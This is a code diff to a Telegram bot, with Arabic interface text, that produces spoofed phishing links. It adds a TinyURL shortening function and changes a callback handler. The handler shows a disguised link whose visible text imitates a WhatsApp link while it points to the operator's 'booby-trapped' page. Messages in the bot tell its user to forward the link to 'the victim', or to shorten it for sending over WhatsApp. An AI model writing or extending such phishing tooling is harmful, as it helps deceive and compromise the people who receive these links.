@@ -269,6 +269,15 @@ async function restoreFromGitHub() {
   return restored;
 }
 
+// Shorten a URL via TinyURL
+async function makeTinyUrl(url) {
+  try {
+    const r = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
+    if (r.ok) { const t = await r.text(); if (t.startsWith("http")) return t.trim(); }
+  } catch(e) {}
+  return null;
+}
+
 // Immediately backup a single local file to GitHub
 async function backupFileToGH(localPath, remotePath) {
   try {
@@ -1344,23 +1353,31 @@ bot.on('callback_query', async (q) => {
       wa:`wa.me/link/${Math.random().toString(36).slice(2,8)}`
     };
     const fakeText = fakeTexts[type] || realLink;
-    // First: explanation message
     return bot.sendMessage(chatId,
       `🎭 *الرابط المخادع جاهز!*\n\n` +
-      `👇 *الرسالة التالية هي اللي تفوردها للضحية*\n` +
-      `عندما يضغط عليها سيُفتح موقعك الملغم مباشرةً 🎣\n\n` +
-      `⚠️ *مهم:* فوردها ولا تنسخ النص — الرابط المخفي يظهر فقط عند الفورد`,
-      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_links"}]]})}
+      `📲 *تلغرام:* فوّرد الرسالة التالية مباشرةً للضحية\n` +
+      `📱 *واتساب/غيره:* اضغط "📋 نسخ رابط قصير" وأرسله`,
+      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
+        [{text:"📋 نسخ رابط قصير للواتساب", callback_data:`pg_short`}],
+        [{text:"🔙 رجوع",callback_data:"pg_links"}]
+      ]})}
     ).then(()=>
-      // Second: the actual spoofed link message (user forwards this to victim)
       bot.sendMessage(chatId,
         `🔗 [${fakeText}](${realLink})`,
-        {parse_mode:"Markdown",
-         reply_markup:JSON.stringify({inline_keyboard:[
-           [{text:"📤 فوردها للضحية ↗️", switch_inline_query:`${fakeText}`}]
-         ]})
-        }
+        {parse_mode:"Markdown"}
       )
+    );
+  }
+
+  if (data === "pg_short") {
+    if (q.from.id !== BOT_OWNER) return;
+    const realLink = `${hostURL}/p`;
+    bot.answerCallbackQuery(q.id, {text:"⏳ جاري إنشاء الرابط..."}).catch(()=>{});
+    const short = await makeTinyUrl(realLink);
+    if (!short) return bot.sendMessage(chatId,"❌ فشل إنشاء الرابط القصير، حاول مرة أخرى.");
+    return bot.sendMessage(chatId,
+      `📋 *الرابط القصير:*\n\n\`${short}\`\n\nانسخه وأرسله من أي تطبيق 📱`,
+      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_links"}]]})}
     );
   }
 
